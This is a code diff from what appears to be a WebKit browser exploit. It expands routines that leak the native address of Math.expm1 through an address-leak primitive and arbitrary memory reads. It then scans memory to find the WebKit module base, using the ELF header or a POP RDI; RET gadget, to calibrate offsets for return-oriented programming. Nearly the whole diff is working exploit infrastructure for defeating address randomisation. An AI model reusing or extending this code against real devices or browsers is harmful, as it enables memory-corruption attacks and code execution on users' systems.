@@ -133,11 +133,81 @@ function safeRead4(p, addr) {
     }
 }
 
-function nativeExpm1(p, mFunctionOff) {
-    const fnCell = p.leakval(Math.expm1);
-    const fnBody = safeRead8(p, fnCell.add32(0x18));
-    if (!fnBody) return null;
-    return safeRead8(p, fnBody.add32(mFunctionOff));
+function resolveNativeFn(p, mFunctionOff) {
+    const cell = p.leakval(Math.expm1);
+    mark("CAL-CELL", String(cell));
+
+    const tryPath = (label, ptr) => {
+        if (!plausibleUserPtr(ptr)) return null;
+        return { ptr, label };
+    };
+
+    const paths = [];
+    const mid = safeRead8(p, cell.add32(0x18));
+    if (mid) {
+        const nat = safeRead8(p, mid.add32(mFunctionOff));
+        const hit = tryPath("cell+0x18 -> +" + mFunctionOff.toString(16), nat);
+        if (hit) paths.push(hit);
+    }
+    for (let o = 0x8; o <= 0x30; o += 8) {
+        const q = safeRead8(p, cell.add32(o));
+        const hit = tryPath("cell+0x" + o.toString(16), q);
+        if (hit) paths.push(hit);
+    }
+
+    if (paths.length === 0) return null;
+    mark("CAL-NATIVEFN-PATH", paths[0].label);
+    return paths[0].ptr;
+}
+
+function nativeExpm1(p, mFunctionOff, quiet) {
+    if (quiet) {
+        const cell = p.leakval(Math.expm1);
+        const mid = safeRead8(p, cell.add32(0x18));
+        if (!mid) return null;
+        return safeRead8(p, mid.add32(mFunctionOff));
+    }
+    return resolveNativeFn(p, mFunctionOff);
+}
+
+function findWebkitBaseElf(p, nativeFn) {
+    if (!plausibleUserPtr(nativeFn)) return null;
+    // Module bases are 0x4000-aligned but expm1 RVA is not — start at nativeFn.low % 0x4000
+    let delta = nativeFn.low & 0x3fff;
+    for (; delta < 0x05000000; delta += 0x4000) {
+        const base = nativeFn.sub32(delta);
+        if (!alignedModuleBase(base)) continue;
+        const magic = safeRead4(p, base);
+        if (magic === 0x464c457f)
+            return { base, wk_expm1_builtin: delta, via: "elf" };
+    }
+    return null;
+}
+
+function findWebkitBaseGadget(p, nativeFn, gadgetRva, expectLo16) {
+    if (!plausibleUserPtr(nativeFn) || !gadgetRva) return null;
+    let delta = nativeFn.low & 0x3fff;
+    for (; delta < 0x05000000; delta += 0x4000) {
+        const base = nativeFn.sub32(delta);
+        if (!alignedModuleBase(base)) continue;
+        const g = safeRead4(p, base.add32(gadgetRva));
+        if (g == null) continue;
+        if ((g & 0xffff) === expectLo16)
+            return { base, wk_expm1_builtin: delta, via: "gadget" };
+    }
+    return null;
+}
+
+function findWebkitBase(p, nativeFn, off) {
+    const elf = findWebkitBaseElf(p, nativeFn);
+    if (elf) return elf;
+    const gadgetRva = off && off.wk_POP_RDI_RET;
+    if (gadgetRva) {
+        mark("CAL-SCAN", "ELF miss — trying POP_RDI at 0x" + gadgetRva.toString(16));
+        const g = findWebkitBaseGadget(p, nativeFn, gadgetRva, 0xc35f);
+        if (g) return g;
+    }
+    return null;
 }
 
 function bufAddr(p, off, ab) {
@@ -177,18 +247,6 @@ function findArrayBufferBacking(p, ab, expectLo) {
     return null;
 }
 
-function findWebkitBase(p, nativeFn) {
-    if (!plausibleUserPtr(nativeFn)) return null;
-    for (let delta = 0; delta < 0x04000000; delta += 0x4000) {
-        const base = nativeFn.sub32(delta);
-        if (!alignedModuleBase(base)) continue;
-        const magic = safeRead4(p, base);
-        if (magic === 0x464c457f)
-            return { base, wk_expm1_builtin: delta };
-    }
-    return null;
-}
-
 function findErrorImport(p, webkitBase, hintRva) {
     if (!plausibleUserPtr(webkitBase)) return null;
     const hi = webkitBase.hi;
@@ -223,11 +281,12 @@ function calibrateOffsets(p, off) {
     }
     mark("CAL-NATIVEFN", String(nativeFn));
 
-    const wk = findWebkitBase(p, nativeFn);
+    const wk = findWebkitBase(p, nativeFn, off);
     if (!wk) {
-        mark("CALIBRATE-FAIL", "webkit base not found via ELF scan");
+        mark("CALIBRATE-FAIL", "webkit base not found (ELF + gadget scan)");
         return null;
     }
+    mark("CAL-VIA", wk.via || "elf");
     mark("CAL-WK-BASE", String(wk.base));
     mark("CAL-wk_expm1_builtin", "0x" + wk.wk_expm1_builtin.toString(16));
 
@@ -358,7 +417,7 @@ async function runOffsetTests() {
     }
 
     if (off.wk_expm1_builtin) {
-        const nativeFn = nativeExpm1(p, off.wk_JSFunction_m_function);
+        const nativeFn = nativeExpm1(p, off.wk_JSFunction_m_function, true);
         if (!nativeFn) {
             checkOffset("module-bases-0x4000-aligned", false, "nativeFn unreadable");
         } else {
